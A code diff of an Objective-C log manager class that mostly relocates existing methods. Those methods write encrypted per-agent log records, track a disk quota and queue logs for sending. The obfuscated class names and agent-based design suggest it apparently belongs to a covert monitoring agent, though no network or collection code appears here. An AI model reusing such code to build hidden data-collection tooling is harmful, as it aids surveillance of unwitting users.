@@ -263,6 +263,16 @@ static __m_MLogManager *sharedLogManager = nil;
   return sharedLogManager;
 }
 
+- (void)release
+{
+  // Do nothing
+}
+
+- (id)autorelease
+{
+  return self;
+}
+
 - (id)retain
 {
   return self;
@@ -272,16 +282,6 @@ static __m_MLogManager *sharedLogManager = nil;
 {
   // Denotes an object that cannot be released
   return UINT_MAX;
-}
-
-- (void)release
-{
-  // Do nothing
-}
-
-- (id)autorelease
-{
-  return self;
 }
 
 #pragma mark -
@@ -515,6 +515,97 @@ static __m_MLogManager *sharedLogManager = nil;
   return FALSE;
 }
 
+- (BOOL)writeDataToLog: (NSData *)aData forHandle: (NSFileHandle *)anHandle
+{
+  @try
+  {
+    [anHandle writeData: aData];
+    
+    // increment disk quota
+    [[__m_MDiskQuota sharedInstance] incUsed: [aData length]];
+  }
+  @catch (NSException *e)
+  {
+#ifdef DEBUG_LOG_MANAGER
+    infoLog(@"%s exception", __FUNCTION__);
+#endif
+    
+    return FALSE;
+  }
+  
+  return TRUE;
+}
+
+- (BOOL)writeDataToLog: (NSMutableData *)aData
+              forAgent: (u_int)agentID
+             withLogID: (u_int)logID
+{
+  BOOL logFound = FALSE;
+  
+  [gActiveQueueLock lock];
+  NSEnumerator *enumerator = [mActiveQueue objectEnumerator];
+  [gActiveQueueLock unlock];
+  
+  id anObject;
+  
+  while (anObject = [enumerator nextObject])
+  {
+    if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID
+        && ([[anObject objectForKey: @"logID"] unsignedIntValue] == logID || logID == 0))
+    {
+      logFound = TRUE;
+      
+      NSFileHandle *logHandle = [anObject objectForKey: @"handle"];
+      
+      NSData *temp = [NSData dataWithBytes: gLogAesKey
+                                    length: CC_MD5_DIGEST_LENGTH];
+      
+      int _blockSize = [aData length];
+      NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
+                                         length: sizeof(int)];
+      
+#ifdef WRITE_CLEAR_TEXT_LOG
+      NSFileHandle *clearHandle = [anObject objectForKey: @"clearHandle"];
+      [clearHandle writeData: blockSize];
+      [clearHandle writeData: aData];
+#endif
+      
+      CCCryptorStatus result = 0;
+      result = [aData __encryptWithKey: temp];
+      
+      if (result == kCCSuccess)
+      {
+        // Writing the size of the clear text block
+        [logHandle writeData: blockSize];
+        // then our log data
+        [logHandle writeData: aData];
+        
+        // increment disk quota
+        [[__m_MDiskQuota sharedInstance] incUsed: [aData length] + sizeof(blockSize)];
+        
+        break;
+      }
+    }
+  }
+  
+  //
+  // If logFound is false and we called this function, it means that the agent
+  // is running but no file was created, thus we need to do it here
+  //
+  
+  //
+  // TODO: There's a non-issue race condition here, this means that two files
+  // could be created instead of one if the sync is running and closeActiveLogs
+  // has been called by passing TRUE for continueLogging
+  //
+  if (logFound == FALSE)
+  {
+    return FALSE;
+  }
+  
+  return TRUE;
+}
+
 - (BOOL)closeActiveLogsAndContinueLogging: (BOOL)continueLogging
 {
   NSMutableIndexSet *discardedItem  = [NSMutableIndexSet indexSet];
@@ -686,97 +777,6 @@ static __m_MLogManager *sharedLogManager = nil;
   return FALSE;
 }
 
-- (BOOL)writeDataToLog: (NSData *)aData forHandle: (NSFileHandle *)anHandle
-{
-  @try
-    {
-      [anHandle writeData: aData];
-      
-      // increment disk quota
-      [[__m_MDiskQuota sharedInstance] incUsed: [aData length]];
-    }
-  @catch (NSException *e)
-    {
-#ifdef DEBUG_LOG_MANAGER
-      infoLog(@"%s exception", __FUNCTION__);
-#endif
-    
-      return FALSE;
-    }
-  
-  return TRUE;
-}
-
-- (BOOL)writeDataToLog: (NSMutableData *)aData
-              forAgent: (u_int)agentID
-             withLogID: (u_int)logID
-{
-  BOOL logFound = FALSE;
-  
-  [gActiveQueueLock lock];
-  NSEnumerator *enumerator = [mActiveQueue objectEnumerator];
-  [gActiveQueueLock unlock];
-  
-  id anObject;
-  
-  while (anObject = [enumerator nextObject])
-    {
-      if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID
-          && ([[anObject objectForKey: @"logID"] unsignedIntValue] == logID || logID == 0))
-        {
-          logFound = TRUE;
-          
-          NSFileHandle *logHandle = [anObject objectForKey: @"handle"];
-
-          NSData *temp = [NSData dataWithBytes: gLogAesKey
-                                        length: CC_MD5_DIGEST_LENGTH];
-                                        
-          int _blockSize = [aData length];
-          NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
-                                             length: sizeof(int)];
-          
-#ifdef WRITE_CLEAR_TEXT_LOG
-          NSFileHandle *clearHandle = [anObject objectForKey: @"clearHandle"];
-          [clearHandle writeData: blockSize];
-          [clearHandle writeData: aData];
-#endif
-          
-          CCCryptorStatus result = 0;
-          result = [aData __encryptWithKey: temp];
-          
-          if (result == kCCSuccess)
-            {
-              // Writing the size of the clear text block
-              [logHandle writeData: blockSize];
-              // then our log data
-              [logHandle writeData: aData];
-            
-              // increment disk quota
-              [[__m_MDiskQuota sharedInstance] incUsed: [aData length] + sizeof(blockSize)];
-              
-              break;
-            }
-        }
-    }
-  
-  //
-  // If logFound is false and we called this function, it means that the agent
-  // is running but no file was created, thus we need to do it here
-  //
-  
-  //
-  // TODO: There's a non-issue race condition here, this means that two files
-  // could be created instead of one if the sync is running and closeActiveLogs
-  // has been called by passing TRUE for continueLogging
-  //
-  if (logFound == FALSE)
-    {
-      return FALSE;
-    }
-  
-  return TRUE;
-}
-
 - (BOOL)removeSendLog: (u_int)agentID
             withLogID: (u_int)logID
 {
@@ -810,6 +810,22 @@ static __m_MLogManager *sharedLogManager = nil;
 #pragma mark Accessors
 #pragma mark -
 
+- (NSEnumerator *)getSendQueueEnumerator
+{
+  NSEnumerator *enumerator;
+  
+  [gSendQueueLock lock];
+  
+  if ([mSendQueue count] > 0)
+    enumerator = [[[mSendQueue copy] autorelease] objectEnumerator];
+  else
+    enumerator = nil;
+  
+  [gSendQueueLock unlock];
+  
+  return enumerator;
+}
+
 - (NSMutableArray *)mActiveQueue
 {
   return mActiveQueue;
@@ -831,20 +847,5 @@ static __m_MLogManager *sharedLogManager = nil;
   return enumerator;
 }
 
-- (NSEnumerator *)getSendQueueEnumerator
-{
-  NSEnumerator *enumerator;
-  
-  [gSendQueueLock lock];
-  
-  if ([mSendQueue count] > 0)
-    enumerator = [[[mSendQueue copy] autorelease] objectEnumerator];
-  else
-    enumerator = nil;
-  
-  [gSendQueueLock unlock];
-  
-  return enumerator;
-}
 
 @end
